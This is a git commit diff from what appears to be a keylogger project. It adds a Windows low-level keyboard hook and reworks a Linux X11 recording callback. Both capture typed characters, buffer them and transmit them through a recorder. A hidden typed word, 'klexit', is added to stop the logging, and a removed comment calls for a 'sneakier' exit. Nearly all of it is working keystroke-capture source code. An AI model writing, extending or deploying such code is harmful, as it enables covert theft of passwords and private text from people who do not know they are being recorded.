070808b645683a55364ecf5bd3a72421e62121b9
ivan-guerra <ivan.eduardo.guerra@gmail.com>
2023-11-10 17:40:27 -0800

    Fully implement the Windows event loop.
    Snuck into this commit is a mechanism for terminating the keylogger.
    Simply type "klexit" and the event loop is exited. This is better than
    exiting on ESC which is what we had before.

--- src/recorder/event_loop.cpp
+++ src/recorder/event_loop.cpp
@@ -2,9 +2,20 @@
 
 #include <atomic>
 #include <cctype>
+#include <cstring>
 #include <stdexcept>
+#include <string>
 
 #include "recorder/recorder.h"
+
+static const char* kExitWord = "klexit";
+
+static void UpdateHistoryStr(char c, std::string& history) {
+  if (history.size() == std::strlen(kExitWord)) {
+    history.erase(history.begin());
+  }
+  history += c;
+}
 
 #ifdef __linux__
 
@@ -63,22 +74,25 @@ void KeyCallback(XPointer closure, XRecordInterceptData* hook) {
       .same_screen = True,
   };
 
-  /* TODO: Need to look into having a sneakier way of exiting the event loop
-   * than just pressing ESC. */
-  const int kEsc = 9;
+  /* History acts as fixed size buffer of the chars seen upto this call, it's
+   * used as mechanism for finding out whether the user has entered the exit
+   * string. */
+  static std::string history;
   char character = '\0';
   int len = ::XLookupString(&raw_event, &character, sizeof(character), nullptr,
                             nullptr);
   switch (event_type) {
     case KeyPress:
-      if (key_code == kEsc) { /* if ESC is pressed at any time, exit */
-        exit_event_loop = true;
-      } else {
-        /* Casting std::isprint()'s argument to unsigned char as advised here:
-         * https://en.cppreference.com/w/cpp/string/byte/isprint*/
-        if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
-          /* Buffer printable characters, discard all others. */
-          cb_data->recorder->BufferKeyPress(character);
+      /* Casting std::isprint()'s argument to unsigned char as advised here:
+       * https://en.cppreference.com/w/cpp/string/byte/isprint*/
+      if ((len > 0) && std::isprint(static_cast<unsigned char>(character))) {
+        /* Buffer printable characters, discard all others. */
+        cb_data->recorder->BufferKeyPress(character);
+
+        UpdateHistoryStr(character, history);
+        if (history == kExitWord) {
+          /* The exit word was typed, terminate the event loop. */
+          exit_event_loop = true;
         }
       }
       break;
@@ -143,80 +157,104 @@ void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
 }
 
 #elif defined(WIN32) || defined(_WIN32) || defined(__WIN32__)
+
 #include <conio.h>
 #include <windows.h>
 
 #include <condition_variable>
 #include <cstdint>
 #include <mutex>
-#include <string>
 #include <thread>
 
-static bool exit = false;
-static std::mutex exit_mtx;
-static std::condition_variable exit_event_loop;
+static bool key_pressed = false;
+static std::mutex key_pressed_mtx;
+static std::condition_variable key_pressed_cv;
+static std::atomic_bool exit_event_loop(false);
+static char ascii_char = 0;
 
 /* https://stackoverflow.com/questions/1387064/how-to-get-the-error-message-from-the-error-code-returned-by-getlasterror
  */
-static std::string GetLastErrorAsString() {
-  /* get the error message ID, if any */
-  DWORD errorMessageID = ::GetLastError();
-  if (errorMessageID == 0) {
-    return std::string(); /* no error message has been recorded */
+static [[nodiscard]] std::string GetLastErrorAsString() {
+  DWORD error_msg_id = ::GetLastError();
+  if (error_msg_id == 0) {
+    return "";
   }
 
-  LPSTR messageBuffer = nullptr;
-
-  /* Ask Win32 to give us the string version of that message ID.
-   * The parameters we pass in, tell Win32 to create the buffer that holds
-   * the message for us (because we don't yet know how long the message
-   * string will be).
-   */
-  size_t size = FormatMessageA(
+  LPSTR msg_buffer = nullptr;
+  size_t size = ::FormatMessageA(
       FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
           FORMAT_MESSAGE_IGNORE_INSERTS,
-      NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-      (LPSTR)&messageBuffer, 0, NULL);
+      nullptr, error_msg_id, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+      reinterpret_cast<LPSTR>(&msg_buffer), 0, nullptr);
 
-  /* copy the error message into a std::string */
-  std::string message(messageBuffer, size);
-
-  /* free the Win32's string's buffer */
-  LocalFree(messageBuffer);
+  std::string message(msg_buffer, size);
+  ::LocalFree(msg_buffer);
 
   return message;
 }
 
+char PressedAsciiChar(const KBDLLHOOKSTRUCT* kbinfo) {
+  unsigned char keyboard_state[256];
+  for (int i = 0; i < 256; ++i)
+    keyboard_state[i] = static_cast<unsigned char>(GetKeyState(i));
+
+  wchar_t wbuffer[3] = {0};
+  int result = ::ToUnicodeEx(kbinfo->vkCode, kbinfo->scanCode, keyboard_state,
+                             wbuffer, sizeof(wbuffer) / sizeof(wchar_t), 0,
+                             ::GetKeyboardLayout(::GetWindowThreadProcessId(
+                                 ::GetForegroundWindow(), NULL)));
+  return (1 == result) ? wbuffer[0] : '\0';
+}
+
 LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam) {
+  /* History acts as fixed size buffer of the chars seen upto this call, it's
+   * used as mechanism for finding out whether the user has entered the exit
+   * string. */
+  static std::string history;
+
   if (nCode < 0) {
-    return CallNextHookEx(nullptr, nCode, wParam, lParam);
+    return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
   }
 
   KBDLLHOOKSTRUCT* kbinfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
-  if (wParam == WM_KEYDOWN) {
-    if (VK_ESCAPE == kbinfo->vkCode) {
-      std::unique_lock<std::mutex> lock(exit_mtx);
-      exit = true;
-      exit_event_loop.notify_one(); /* Signal the main thread to exit. */
-      PostQuitMessage(0);           /* Signal this kbd hook thread to exit. */
-    }
-  }
+  switch (wParam) {
+    case WM_KEYDOWN: {
+      std::unique_lock<std::mutex> lock(key_pressed_mtx);
+      key_pressed = true;
+      if (exit_event_loop) {
+        /* A failure in the main thread has triggered an exit. */
+        ::PostQuitMessage(0);
+      } else {
+        ascii_char = PressedAsciiChar(kbinfo);
 
-  return CallNextHookEx(nullptr, nCode, wParam, lParam);
+        UpdateHistoryStr(ascii_char, history);
+        if (history == kExitWord) {
+          /* The user has entered the exit string so exit. */
+          exit_event_loop = true; /* Signal the main thread to exit. */
+          ::PostQuitMessage(0);   /* Signal this kbd hook thread to exit. */
+        }
+      }
+      key_pressed_cv.notify_one();
+      break;
+    }
+    default:
+      break;
+  }
+  return ::CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 void InstallHook() {
-  HHOOK kbd_hook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyCallback, 0, 0);
+  HHOOK kbd_hook = ::SetWindowsHookEx(WH_KEYBOARD_LL, &KeyCallback, 0, 0);
   if (!kbd_hook) {
     return;
   }
 
   MSG message;
-  while (GetMessage(&message, nullptr, 0, 0)) {
-    DispatchMessage(&message);
+  while (::GetMessage(&message, nullptr, 0, 0)) {
+    ::DispatchMessage(&message);
   }
 
-  UnhookWindowsHookEx(kbd_hook);
+  ::UnhookWindowsHookEx(kbd_hook);
 }
 
 void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
@@ -224,10 +262,35 @@ void keylogger::RecordKeyPressEvents(keylogger::Recorder* recorder) {
   std::thread kbd_event_thrd(InstallHook);
 
   /* Wait until signaled to exit by the keyboard hook. */
-  std::unique_lock<std::mutex> lock(exit_mtx);
-  exit_event_loop.wait(lock, [] { return exit; });
+  while (!exit_event_loop) {
+    std::unique_lock<std::mutex> lock(key_pressed_mtx);
+    /* Wait until a key press event has occurred. */
+    key_pressed_cv.wait(lock, [] { return key_pressed; });
+    key_pressed = false;
+
+    try {
+      if (std::isprint(static_cast<unsigned char>(ascii_char))) {
+        recorder->BufferKeyPress(ascii_char);
+      }
+    } catch (const std::exception& e) {
+      /* Join the event handling thread. */
+      exit_event_loop = true;
+      /* The event thread is waiting on the key_pressed_mtx so it's important we
+       * unlock it here! */
+      lock.unlock();
+      if (kbd_event_thrd.joinable()) {
+        kbd_event_thrd.join();
+      }
+      /* Propagate the exception upto the caller. */
+      throw e;
+    }
+  }
+
+  /* Flush any remaining keycodes in the recorder. */
+  recorder->Transmit();
 
   if (kbd_event_thrd.joinable()) {
+    /* Join the event thread in the case of a normal exit. */
     kbd_event_thrd.join();
   }
 }
